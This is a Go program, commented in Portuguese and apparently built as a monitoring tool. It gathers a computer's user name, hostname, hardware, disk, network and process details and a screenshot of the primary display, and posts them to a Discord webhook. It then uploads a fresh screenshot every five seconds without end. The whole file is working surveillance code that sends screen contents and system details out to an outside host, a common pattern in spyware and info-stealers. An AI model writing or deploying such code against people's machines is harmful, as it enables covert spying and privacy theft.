package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/StackExchange/wmi"
	"github.com/kbinani/screenshot"
	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/mem"
	"github.com/shirou/gopsutil/v3/net"
	"github.com/shirou/gopsutil/v3/process"
)

const webhookURL = "seu_webhook_aqui" // seu webhook aqui

type EmbedField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline"`
}

type Embed struct {
	Title  string       `json:"title"`
	Color  int          `json:"color"`
	Fields []EmbedField `json:"fields"`
	Footer struct {
		Text    string `json:"text"`
		IconURL string `json:"icon_url"`
	} `json:"footer"`
}

type Payload struct {
	Username  string  `json:"username"`
	AvatarURL string  `json:"avatar_url"`
	Embeds    []Embed `json:"embeds"`
}

// Struct usada pelo WMI no Windows
type Win32_VideoController struct {
	Name         string
	AdapterRAM   uint32
	DriverVersion string
}

func getGPUInfo() string {
	if (runtime.GOOS == "windows") {
		var controllers []Win32_VideoController
		err := wmi.Query("SELECT Name, AdapterRAM, DriverVersion FROM Win32_VideoController", &controllers)
		if (err != nil || len(controllers) == 0) {
			return "🎨 N/A (WMI error)"
		}
		var output string
		for _, gpu := range controllers {
			vram := float64(gpu.AdapterRAM) / (1024 * 1024)
			output += fmt.Sprintf("%s (%.0f MB VRAM)\n", gpu.Name, vram)
		}
		return output
	} else {
		// Para sistemas não-Windows, retornamos um valor genérico
		return "🎨 N/A (Sem informações sobre GPU)"
	}
}

func formatUptime(uptime uint64) string {
	days := uptime / (60 * 60 * 24)
	hours := (uptime % (60 * 60 * 24)) / (60 * 60)
	minutes := (uptime % (60 * 60)) / 60
	return fmt.Sprintf("%dd %dh %dm", days, hours, minutes)
}

func getTopProcesses() string {
	processes, err := process.Processes()
	if err != nil {
		return "N/A"
	}

	type ProcessInfo struct {
		Name string
		CPU  float64
		Mem  float32
	}

	var processInfos []ProcessInfo
	for _, p := range processes {
		name, err := p.Name()
		if err != nil {
			continue
		}
		cpu, _ := p.CPUPercent()
		mem, _ := p.MemoryPercent()
		
		processInfos = append(processInfos, ProcessInfo{
			Name: name,
			CPU:  cpu,
			Mem:  mem,
		})
	}

	// Ordenar por uso de CPU (simplificado)
	result := ""
	count := 0
	for _, p := range processInfos {
		if count >= 5 {
			break
		}
		if p.CPU > 0.1 { // Apenas processos com uso significativo
			result += fmt.Sprintf("📊 %s (CPU: %.1f%%, Mem: %.1f%%)\n", p.Name, p.CPU, p.Mem)
			count++ 
		}
	}
	
	return result
}

func getNetworkInfo() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "N/A"
	}

	var result strings.Builder
	for _, iface := range interfaces {
		// Ignorar interfaces que não são físicas
		if !strings.Contains(strings.ToLower(iface.Name), "ethernet") &&
			!strings.Contains(strings.ToLower(iface.Name), "wi-fi") &&
			!strings.Contains(strings.ToLower(iface.Name), "wlan") {
			continue
		}

		stats, err := net.IOCounters(true)
		if err != nil {
			continue
		}

		for _, stat := range stats {
			if stat.Name == iface.Name {
				result.WriteString(fmt.Sprintf("🌐 %s:\n", iface.Name))
				result.WriteString(fmt.Sprintf("   ↑ %.2f MB enviados\n", float64(stat.BytesSent)/(1024*1024)))
				result.WriteString(fmt.Sprintf("   ↓ %.2f MB recebidos\n", float64(stat.BytesRecv)/(1024*1024)))
			}
		}
	}
	
	return result.String()
}

func captureScreenshot() (string, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "", fmt.Errorf("nenhum display encontrado")
	}

	// Captura o display principal (índice 0)
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", err
	}

	// Cria um nome de arquivo temporário
	tmpDir := os.TempDir()
	filename := filepath.Join(tmpDir, fmt.Sprintf("screenshot_%d.png", time.Now().Unix()))

	// Salva a imagem
	file, err := os.Create(filename)
	if err != nil {
		return "", err
	}
	defer file.Close()

	err = png.Encode(file, img)
	if err != nil {
		return "", err
	}

	return filename, nil
}

func sendToDiscord(payload Payload, screenshotPath string) error {
	// Prepara o body do multipart form
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Adiciona o payload JSON
	payloadJson, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	_ = writer.WriteField("payload_json", string(payloadJson))

	// Adiciona a imagem se existir
	if screenshotPath != "" {
		file, err := os.Open(screenshotPath)
		if err != nil {
			return err
		}
		defer file.Close()

		part, err := writer.CreateFormFile("files[0]", "screenshot.png")
		if err != nil {
			return err
		}
		_, err = io.Copy(part, file)
		if err != nil {
			return err
		}
	}

	err = writer.Close()
	if err != nil {
		return err
	}

	// Cria e envia a requisição
	req, err := http.NewRequest("POST", webhookURL, body)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		fmt.Println("✅ Informações enviadas com sucesso para o Discord! (Status 204 - Sem conteúdo de resposta)")
	} else if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("erro ao enviar: Status %d", resp.StatusCode)
	}

	return nil
}

func main() {
	fmt.Println("Iniciando monitoramento em segundo plano...")
	fmt.Println("Enviando informações do sistema e depois screenshots a cada 5 segundos...")

	// Criar um ticker que dispara a cada 5 segundos
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	// Função para enviar apenas screenshot
	sendScreenshot := func() error {
		now := time.Now().Format("02/01/2006 15:04:05")
		
		// Captura a screenshot
		screenshotPath, err := captureScreenshot()
		if err != nil {
			return fmt.Errorf("erro ao capturar screenshot: %v", err)
		}
		defer os.Remove(screenshotPath)

		// Cria um payload simples sem embed
		payload := Payload{
			Username:  "Username",
			AvatarURL: "image.png",
		}

		// Envia para o Discord
		err = sendToDiscord(payload, screenshotPath)
		if err != nil {
			return err
		}

		fmt.Printf("📸 Screenshot enviada em: %s\n", now)
		return nil
	}

	// Função para coletar e enviar informações completas
	sendFullInfo := func() error {
		user := os.Getenv("USERNAME")
		if user == "" {
			user = os.Getenv("USER")
		}
		hostname, _ := os.Hostname()
		now := time.Now().Format("02/01/2006 15:04:05")

		osInfo, _ := host.Info()
		cpuInfo, _ := cpu.Info()
		cpuCores, _ := cpu.Counts(true)
		memInfo, _ := mem.VirtualMemory()
		disks, _ := disk.Partitions(true)

		totalRAM := float64(memInfo.Total) / (1024 * 1024 * 1024)
		usedRAM := float64(memInfo.Used) / (1024 * 1024 * 1024)

		var diskInfo string
		for _, d := range disks {
			usage, err := disk.Usage(d.Mountpoint)
			if err != nil || usage.Total == 0 {
				continue
			}
			total := float64(usage.Total) / (1024 * 1024 * 1024)
			used := float64(usage.Used) / (1024 * 1024 * 1024)
			diskInfo += fmt.Sprintf("💽 **%s** - %.2f GB / %.2f GB\n", d.Mountpoint, used, total)
		}

		gpuInfo := getGPUInfo()

		// Obter uso atual da CPU
		cpuPercent, _ := cpu.Percent(time.Second, false)
		cpuUsage := "N/A"
		if len(cpuPercent) > 0 {
			cpuUsage = fmt.Sprintf("%.1f%%", cpuPercent[0])
		}

		// Obter uptime formatado
		uptime := formatUptime(osInfo.Uptime)

		embed := Embed{
			Title: "✨ Informações do PC ✨",
			Color: 0xFF69B4,
			Fields: []EmbedField{
				{"👩‍💻 User", user, true},
				{"💻 Hostname", hostname, true},
				{"🕘 Data e Hora", now, false},
				{"📀 Sistema", fmt.Sprintf("%s (%s)", osInfo.Platform, osInfo.KernelArch), true},
				{"⏰ Uptime", uptime, true},
				{"⚙️ CPU", fmt.Sprintf("%s (%d núcleos)", cpuInfo[0].ModelName, cpuCores), false},
				{"📊 Uso da CPU", cpuUsage, true},
				{"🧠 RAM", fmt.Sprintf("%.2f GB / %.2f GB", usedRAM, totalRAM), true},
				{"🎮 GPU", gpuInfo, false},
				{"💾 Discos", diskInfo, false},
				{"🌐 Rede", getNetworkInfo(), false},
				{"📱 Processos Principais", getTopProcesses(), false},
			},
		}
		embed.Footer.Text = "Enviado via Webhook!"
		embed.Footer.IconURL = "FOOTER_ICON_URL"

		payload := Payload{
			Username:  "Username",
			AvatarURL: "image.png",
			Embeds:    []Embed{embed},
		}

		// Captura a screenshot
		screenshotPath, err := captureScreenshot()
		if err != nil {
			fmt.Println("⚠️ Erro ao capturar screenshot:", err)
			screenshotPath = ""
		} else {
			defer os.Remove(screenshotPath)
		}

		// Envia para o Discord
		err = sendToDiscord(payload, screenshotPath)
		if err != nil {
			return err
		}

		fmt.Printf("📸 Informações completas enviadas em: %s\n", now)
		return nil
	}

	// Enviar as informações completas na primeira vez
	if err := sendFullInfo(); err != nil {
		fmt.Println("❌ Erro ao enviar informações iniciais:", err)
	}

	// Loop infinito para continuar enviando apenas screenshots
	for range ticker.C {
		if err := sendScreenshot(); err != nil {
			fmt.Println("❌ Erro ao enviar screenshot:", err)
		}
	}
}
